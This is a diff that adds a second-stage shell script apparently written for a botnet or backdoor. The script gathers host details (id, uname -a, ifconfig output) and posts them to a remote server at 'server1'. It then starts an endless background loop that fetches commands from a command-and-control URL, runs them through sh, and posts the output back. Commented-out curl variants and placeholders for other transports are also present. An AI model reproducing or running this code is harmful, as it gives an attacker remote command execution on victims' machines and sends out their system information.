@@ -1,0 +1,60 @@
+#!/bin/sh
+
+# stage 2
+repurl="http://server1/stage2/s2cmd.php";
+ccurl="http://server1/stage2/s2cus.php";
+
+timeout="10"; #60
+
+# XXX enough? hash?
+botid="$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM";
+
+# urlencoding
+urle () {
+ # method 1, shell commands
+ echo -ne "$1" | xxd -plain | tr -d '\n' | sed 's/\(..\)/%\1/g'
+ # method 2, perl
+ # XXX
+}
+
+mid=`urle "\`id 2>/dev/null\`"`;
+muname=`urle "\`uname -a 2>/dev/null\`"`;
+mifconfig=`urle "\`/sbin/ifconfig 2>/dev/null\`"`;
+
+report="botid=$botid&id=$mid&uname=$muname&ifconfig=$mifconfig";
+report_curl=`echo "$report"| sed 's/\&/ --data-binary /g'`;
+
+# doing something REALLY evil here, muehehe
+
+# initial report + beacame a bot in background
+
+# wget version
+( wget -qO- --post-data="$report" "$repurl" >/dev/null 2>&1 )&
+( while true; do result=`wget -qO- --post-data="botid=$botid&mode=in" "$ccurl" 2>/dev/null | sh 2>&1`; if [ -n "$result" ]; then wget -qO- --post-data="botid=$botid&mode=out&result=`urle \"$result\"`" "$ccurl"; fi; sleep "$timeout"; done)&
+#( while true; do result=`wget -qO- --post-data="botid=$botid" --post-data "mode=in" "$ccurl" 2>/dev/null | sh 2>&1`; if [ -n "$result" ]; then wget -qO- --post-data="botid=$botid" --post-data="mode=out" --post-data="result=`urle $result`" "$ccurl"; fi; sleep "$timeout"; done)&
+
+# curl
+#(
+
+#echo "t: $report :t"
+#echo "curl -s --data-binary $report_curl $repurl"
+#curl -s --data-binary "$report_curl" "$repurl" 
+#>/dev/null 2>&1 )&
+
+#( while true; do curl -s --post-data="botid=$botid" "$ccurl" 2>/dev/null | sh 2>/dev/null; sleep "$timeout"; done)&
+
+# bash sockets
+
+# netcat
+
+# socat
+
+# perl
+
+# php
+
+# python
+
+# java?
+
+
